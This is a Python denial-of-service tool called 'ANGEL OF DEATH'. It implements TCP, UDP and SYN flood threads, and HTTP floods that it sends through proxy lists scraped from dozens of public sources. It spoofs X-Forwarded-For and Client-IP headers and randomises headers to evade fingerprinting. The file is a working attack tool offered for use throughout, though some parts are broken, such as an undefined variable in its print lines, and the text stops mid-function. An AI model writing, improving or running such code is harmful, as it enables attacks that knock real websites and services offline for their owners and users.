#!/usr/bin/env python3
#coding: utf8
import datetime
import json
import os
import platform
import random
import socket
import ssl
import string
import sys
import threading
import time
import urllib
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests
import socks

global current_date
current_date = datetime.date.today()

# ANSI COLORS
RED  = '\033[1;31m' 
GREEN  = '\033[1;32m'
CYAN  = '\033[1;36m'
YELLOW = '\033[1;33m'
CLOSE = '\x1b[0m'

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    
    
# START TCP SECTION #
class tcp_flood(threading.Thread):
    def __init__(self, url, port, size, packets):
        self.url = url
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        super().__init__()

    def run(self):
        try:
            self.tcp.connect((self.url, self.port))
            self.tcp.setblocking(0)
            for i in range(self.packets):
                try:
                    bytes_to_send = os.urandom(self.size)
                    self.tcp.sendall(bytes_to_send)
                    print(f'[+] [ L4 ] {YELLOW}[ TCP FLOOD ]{CLOSE} {t:<3} Sending Packets >>> {RED}[ {self.url}:{self.port} ]{CLOSE}')
                except (BrokenPipeError, ConnectionResetError):
                
                    print(f"[!] [ L4 ] {YELLOW}[ TCP FLOOD ]{CLOSE:<3} Fixed Broken Connection")
                    self.tcp.close()
                    self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.tcp.connect((self.url, self.port))
                except Exception as e:
                    pass
        except Exception as e:
            pass
# END TCP SECTION #


# START UDP SECTION #
class udp_flood(threading.Thread):
    def __init__(self, url, port, size, packets):
        self.url = url
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.settimeout(1)
        super().__init__()

    def run(self):
        try:
            for i in range(self.packets):
                try:
                    bytes_to_send = os.urandom(self.size)
                    if self.port == 0:
                        self.port = random.randrange(1, 65535)
                    self.udp.sendto(bytes_to_send, (self.url, self.port))
                    print(f'[+] [ L4 ] {YELLOW}[ UDP FLOOD ]{CLOSE} {t:<3} Sending Packets >>> {RED}[ {self.url}:{self.port} ]{CLOSE}')
                except socket.timeout as e:
                    print(f"[-] [ L4 ] {YELLOW}[ UDP FLOOD ]{CLOSE} {RED}Connection Timedout{CLOSE}")
                    
                except Exception as e:
                   pass
                   
        except Exception as e:
            pass
# END UDP SECTION #


# START SYN SECTION #            
class syn_flood(threading.Thread):
    def __init__(self, url, port, packets):
        self.url = url
        self.port = port
        self.packets = packets
        super().__init__()

    def run(self):
        try:
            with socket.socket() as syn:
                syn.connect((self.url, self.port))
                for i in range(self.packets):
                    try:
                        print(f'[+] [ L4 ] {YELLOW}[ SYN FLOOD ]{CLOSE} {t:<3} Sending Packets >>> {RED}[ {self.url}:{self.port} ]{CLOSE}')
                    except Exception as e:
                        pass
        except Exception as e:
            pass
# END SYN SECTION #


# START NO MANS LAND #
acceptall = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept-Encoding: gzip, deflate\r\n',
    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
    'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
    'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
    ]
    


with open("user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]
    
with open("referer_list.json", "r") as referers:
    referer_list = json.load(referers)["referers"]    

def check_url():
    black_list = ['kali.org']
    
    if ("edu" in url) or ("fbi" in url) or ("cia" in url) or ("gov" in url) or ("nsa" in url) or ("nasa" in url):
        print('\n[*] Site is in white list')
        print('[*] You did this to yourself ;)\n')
            
    elif url in black_list:
        print('[×] Site is in black list')
        sys.exit()
 
# END NO MANS LAND #       
    

# START TOOLS SECTION #

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [f'Linux x86_64', f'Linux i386'],
            'ext': [f'X11']
        },
        'windows': {
            'name': [f'Windows NT {random.choice(["6.1", "6.3", "5.1", "6.2"])}' for _ in range(10)],
            'ext': [f'WOW64', f'Win64; x64']
        },
        'mac': {
            'name': [f'Macintosh'],
            'ext': [f'Intel Mac OS X {random.randint(10, 11)}_{random.randint(0, 9)}_{random.randint(0, 5)}' for _ in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': [f'AppleWebKit/{random.randint(535, 537)}.{random.randint(1, 36)}' for _ in range(1, 30)],
            'details': [f'KHTML, like Gecko'],
            'extensions': [
                f'Chrome/{random.randint(6, 32)}.0.{random.randint(100, 2000)}.{random.randint(0, 100)} Safari/{random.randint(535, 537)}.{random.randint(1, 36)}'
                for _ in range(1, 30)] +
                [f'Version/{random.randint(4, 6)}.{random.randint(0, 1)}.{random.randint(0, 9)} Safari/{random.randint(535, 537)}.{random.randint(1, 36)}'
                 for _ in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': [f'MSIE {version}' for version in ["6.0", "6.1", "7.0", "7.0b", "8.0", "9.0", "10.0"]],
                'ext_pre': [f'compatible', f'Windows; U'],
                'ext_post': [f'.NET CLR {random.randint(1, 3)}.{random.randint(0, 5)}.{random.randint(1000, 30000)}' for _ in range(1, 10)]
            }
        },
        'gecko': {
            'name': [f'Gecko/{random.randint(2001, 2010)}{random.randint(1, 31)}{random.randint(1, 12)} Firefox/{random.randint(10, 25)}.0' for _ in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}



def generate_Useragent():
    # Mozilla Version
    mozilla_version = "Mozilla/5.0"

    # System And Browser Information
    os_key = random.choice(list(USER_AGENT_PARTS['os'].keys()))
    os_dict = USER_AGENT_PARTS['os'][os_key]
    os_name = random.choice(os_dict['name'])
    sysinfo = os_name

    # Choose random platform
    platform_key = random.choice(list(USER_AGENT_PARTS['platform'].keys()))
    platform_dict = USER_AGENT_PARTS['platform'][platform_key]

    # Get Browser Information if available
    if 'browser_info' in platform_dict and platform_dict['browser_info']:
        browser = platform_dict['browser_info']

        browser_string = random.choice(browser['name'])

        if 'ext_pre' in browser:
            browser_string = f"{random.choice(browser['ext_pre'])}; {browser_string}"

        sysinfo = f"{browser_string}; {sysinfo}"

        if 'ext_post' in browser:
            sysinfo = f"{sysinfo}; {random.choice(browser['ext_post'])}"

    if 'ext' in os_dict and os_dict['ext']:
        sysinfo = f"{sysinfo}; {random.choice(os_dict['ext'])}"

    ua_string = f"{mozilla_version} ({sysinfo})"

    if 'name' in platform_dict and platform_dict['name']:
        ua_string = f"{ua_string} {random.choice(platform_dict['name'])}"

    if 'details' in platform_dict and platform_dict['details']:
        ua_string = f"{ua_string} ({random.choice(platform_dict['details']) if len(platform_dict['details']) > 1 else platform_dict['details'][0]})"

    if 'extensions' in platform_dict and platform_dict['extensions']:
        ua_string = f"{ua_string} {random.choice(platform_dict['extensions'])}"

    return ua_string

        
def generate_random_headers(host):

    # Random no-cache entries
    noCacheDirectives = ['no-cache', 'max-age=0']
    random.shuffle(noCacheDirectives)
    nrNoCache = random.randint(1, len(noCacheDirectives))
    noCache = ', '.join(noCacheDirectives[:nrNoCache])

    # Random accept encoding
    acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
    random.shuffle(acceptEncoding)
    nrEncodings = random.randint(1, len(acceptEncoding) // 2)
    roundEncodings = acceptEncoding[:nrEncodings]

    http_headers = {
        'User-Agent': f'{random.choice(user_agents)}',
        'Cache-Control': noCache,
        'Accept-Encoding': ', '.join(roundEncodings),
        'Connection': 'keep-alive',
        'Keep-Alive': str(random.randint(1, 1000)),
        'Host': host,
    }

    # Randomly-added headers
    # These headers are optional and are
    # randomly sent thus making the
    # header count random and unfingerprintable
    
    if random.randrange(2) == 0:
        # Random accept-charset
        acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
        random.shuffle(acceptCharset)
        http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
            acceptCharset[0],
            acceptCharset[1],
            round(random.random(), 1),
            round(random.random(), 1)
        )

    if random.randrange(2) == 0:
        # Random Referer
        referers = referer_list
        url_part = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(5, 10)))
        random_referer = random.choice(referers) + url_part

        if random.randrange(2) == 0:
            random_referer = random_referer + '?' + generateQueryString(random.randint(1, 10))

        http_headers['Referer'] = random_referer

    if random.randrange(2) == 0:
        # Random Content-Type
        http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

    if random.randrange(2) == 0:
        # Random Cookie
        http_headers['Cookie'] = generateQueryString(random.randint(1, 5))

    return http_headers

def generateQueryString(length):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length))

# END TOOLS SECTION #


def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

         
def logo():
    print(f'''\n{RED}
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
            ⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
            ⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
            ⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
            ⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
            ⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
            ⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
        {CLOSE}    
            ⠀⠀⠀⠀    {YELLOW}>>> YOUR TIME HAS COME <<<{CLOSE}
                      {YELLOW}>>> ANGEL OF DEATH <<<{CLOSE}      
''')


# START PROXY / SOCKS SECTION #


def get_proxies(output_file, api_list):
    with open(f'{os.getcwd()}/Files/{output_file}', 'wb') as f:
        for api in api_list:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)                
            except Exception as e:
                print(f"[-] Error getting proxies from {api}: {e}")

socks4_api = [
    #"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
    #"https://openproxy.space/list/socks4",
    "https://openproxylist.xyz/socks4.txt",
    "https://proxyspace.pro/socks4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    #"https://spys.me/socks.txt",
    #"https://www.freeproxychecker.com/result/socks4_proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxyscan.io/download?type=socks4",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
    "https://api.openproxylist.xyz/socks4.txt",
]

socks5_api = [
	"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
	"https://www.proxy-list.download/api/v1/get?type=socks5",
	"https://www.proxyscan.io/download?type=socks5",
	"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
	"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
	"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
	"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
	"https://api.openproxylist.xyz/socks5.txt",
	#"https://www.freeproxychecker.com/result/socks5_proxies.txt",
	#http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
	"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
	#"https://openproxy.space/list/socks5",
	"https://openproxylist.xyz/socks5.txt",
	"https://proxyspace.pro/socks5.txt",
	"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
	"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
	"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
	"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
	"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
	#"https://spys.me/socks.txt",
	#"http://www.socks24.org/feeds/posts/default"",
]

http_api = [
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxyscan.io/download?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
    "http://alexa.lr2b.com/proxylist.txt",
    #"https://www.freeproxychecker.com/result/http_proxies.txt",
    #"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
    "https://proxy-spider.com/api/proxies.example.txt",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    #"https://openproxy.space/list/http",
    "https://openproxylist.xyz/http.txt",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/https.txt",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://rootjazz.com/proxies/proxies.txt",
    "https://sheesh.rip/http.txt",
    #"https://spys.me/proxy.txt",
    "https://www.proxy-list.download/api/v1/get?type=https",
]


def check_proxies(file1, file2, file3):
    missing_files = []

    if not os.path.isfile(f'{os.getcwd()}/Files/{file1}'):
        missing_files.append(file1)
    
    if not os.path.isfile(f'{os.getcwd()}/Files/{file2}'):
        missing_files.append(file2)
    
    if not os.path.isfile(f'{os.getcwd()}/Files/{file3}'):
        missing_files.append(file3)




    if len(missing_files) == 0:
        clear()
        logo()
        print("All proxies are present.")
        
        get_new = input('[*] Do you want to get new proxies? [Y/N]: ').lower()
        if get_new == 'y':
                  
          get_proxies('socks4.txt', socks4_api)
          get_proxies('socks5.txt', socks5_api)
          get_proxies('https.txt', http_api)
          
          print(f"[+] Got All Proxies Successfully ( Live 100% )")
        else:
            pass
    
    
    elif len(missing_files) == 1:
        clear()
        logo()
        print(f"{missing_files[0]} is missing.")
        print("[*] Please wait while we're getting proxies...")
        
        get_proxies('socks4.txt', socks4_api)
        # get_proxies('socks5.txt', socks5_api)
        # get_proxies('https.txt', http_api)
        print(f"[+] Got All Proxies Successfully ( Live 100% )")
        
        
    elif len(missing_files) == 2:
        clear()
        logo()
        print(f"{missing_files[0]} and {missing_files[1]} are missing.")
        print("[*] Please wait while we're getting proxies...")
        
                  
        get_proxies('socks4.txt', socks4_api)
        get_proxies('socks5.txt', socks5_api)
        # get_proxies('https.txt', http_api)
        print(f"[+] Got All Proxies Successfully ( Live 100% )")
           
    else:
        clear()
        logo()
        print(f"{', '.join(missing_files)} are missing.")        
        print("[*] Please wait while we're getting proxies...")
        
        get_proxies('socks4.txt', socks4_api)
        get_proxies('socks5.txt', socks5_api)
        get_proxies('https.txt', http_api)    
        print(f"[+] Got All Proxies Successfully ( Live 100% )")
             
check_proxies(f"socks4.txt", f"socks5.txt", f"https.txt")



def proxy_options():
    global url, port, attack_method, host_url, thread
    
    check_proxies(f"socks4.txt", f"socks5.txt", f"https.txt")


    url = input('[*] Target [ URL/IP ]: ')
    port = input('[*] Target Port: ')
    thread_input = input('[*] Thread: ')
    
    check_url()
    
    if not url:
        proxy_options()
    if not port:
        port = 80 
    if not thread_input:
        thread = 1000
    else:
        thread = int(thread_input)
    
                    
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("[!] Invalid Url")
        proxy_options()
        
        
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
        
        
    
    print("\n├─── [1] Request [ Normal ]")
    print("├─── [2] Request [  Spam  ]")
    
    attack_method = input('\n[*] Choose: ')
          
class Proxy(threading.Thread):
   
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error

        useragent = f"User-Agent: {random.choice(user_agents)}\r\n"
        accept =    f"Accept: {random.choice(acceptall)}\r\n"
        connection = "Connection: Keep-Alive\r\n"
        randomip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        forward = f"X-Forwarded-For: {randomip}\r\n"
        forward += f"Client-IP: {randomip}\r\n"
        referer = f"Referer: {random.choice(referer_list)}{url}\r\n"
       
        if attack_method == "1":
           get_host = f"GET / HTTP/1.1\r\nHost: {host_url}:{port}\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ f" /?={random.randint(0,20000)} HTTP/1.1\r\nHost: {host_url}:{port} \r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            
            
        with open('Files/https.txt', 'r') as f:
            proxies = f.readlines()
        

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                proxy = random.choice(proxies).strip().split(":")
                
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
     
                print(f'[+] [ L7 ] {YELLOW}[ Proxy ]{CLOSE} × {proxy[0]}:{proxy[1]:<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')
                
                try:
                    for i in range(thread):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        
                        print(f'[+] [ L7 ] {YELLOW}[ Proxy ]{CLOSE} × {proxy[0]}:{proxy[1]:<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')
                
                        
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                    proxy = random.choice(proxies).strip().split(":")
                except:
                    pass


class Socks(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error


        useragent = f"User-Agent: {random.choice(user_agents)}\r\n"
        accept =    f"Accept: {random.choice(acceptall)}\r\n"
        connection = "Connection: Keep-Alive\r\n"
        randomip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        forward = f"X-Forwarded-For: {randomip}\r\n"
        forward += f"Client-IP: {randomip}\r\n"
        referer = f"Referer: {random.choice(referer_list)}{url}\r\n"


        if attack_method == "1":
           get_host = f"GET / HTTP/1.1\r\nHost: {host_url}:{port}\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ f" /?={random.randint(0,20000)} HTTP/1.1\r\nHost: {host_url}:{port} \r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"

                        
        with open('Files/socks4.txt', 'r') as f:
            socks4 = f.readlines()    
        with open('Files/socks5.txt', 'r') as f:
            socks5 = f.readlines()
        proxies = socks4 + socks5
        
        while True:
            try:
                proxy = random.choice(proxies).strip().split(":")
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                
                s.connect((str(host_url), int(port)))
                if f"{port}" == "443":
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=str(host_url))
                        
                    print(f'[+] [ L7 ] {YELLOW}[   SSL  ]{CLOSE} × {(proxy[0]):<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')

                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                
                print(f'[+] [ L7 ] {YELLOW}[  Socks ]{CLOSE} × {(proxy[0]):<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')

                try:
                    for i in range(thread):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                except:
                    pass

                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(host_url), int(port)))

                    if f"{port}" == "443":
                        context = ssl.create_default_context()
                        s = context.wrap_socket(s, server_hostname=str(host_url))
                                                  
                        print(f'[+] [ L7 ] {YELLOW}[  SSL2  ]{CLOSE} × {(proxy[0]):<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')
                        
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        
                    print(f'[+] [ L7 ] {YELLOW}[ Socks4 ]{CLOSE} × {(proxy[0]):<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')
                    
                    try:
                        for i in range(thread):

                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))

                            print(f'[+] [ L7 ] {YELLOW}[  SSL3  ]{CLOSE} × {(proxy[0]):<15} >>> {RED}[ {host_url}:{port} ]{CLOSE}')

                    except:
                        try:
                            s.close()
                        except:
                            pass
                except:
                    try:
                        s.close()
                        proxy = random.choice(proxies).strip().split(":")
                    except:
                        pass
# END PROXY / SOCKS SECTION #


# START HTTPS SECTION #
flag = 0
safe = 0
counter = 0
code = 0


def build_block(size):
    random_letters = [random.choice(string.ascii_uppercase) for _ in range(size)]
    return ''.join(random_letters)

def set_flag(value):
    global flag
    flag = value


def inc_counter():
    global counter
    counter += 999999

                  
def https(url):    
    # referer = random.choice(referer_list) + host_url + build_block(random.randint(5, 10))
    referer = random.choice(referer_list) + host_url
    
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"        
    else:
        param_joiner = "?"
        
    request = urllib.request.Request(
    # url + param_joiner + build_block(random.randint(0, 60000)) + '/=' + build_block(random.randint(0, 60000))
    # url + f"/{param_joiner}=" + build_block(random.randint(0, 60000))
    url + f"/{param_joiner}=" + str(random.randint(0, 60000))
    )
        

    randomip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"        
    request.add_header('User-Agent', f'{random.choice(user_agents)}')
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Accept-Language', 'en-US,en;q=0.5')
    request.add_header('Referer', referer)
    request.add_header('Keep-Alive', f'{random.randint(110, 120)}')
    request.add_header('Connection', 'keep-alive')
    request.add_header('Client-IP', f'{randomip}')
    request.add_header('X-Forwarded-For', f'{randomip}')
    request.add_header('Host', host_url)
    
    with open('Files/https.txt', 'r') as f:
        listproxy = f.readlines()
    
    index = random.randint(0, len(listproxy) - 1)
    proxy = urllib.request.ProxyHandler({'http': listproxy[index].strip()})
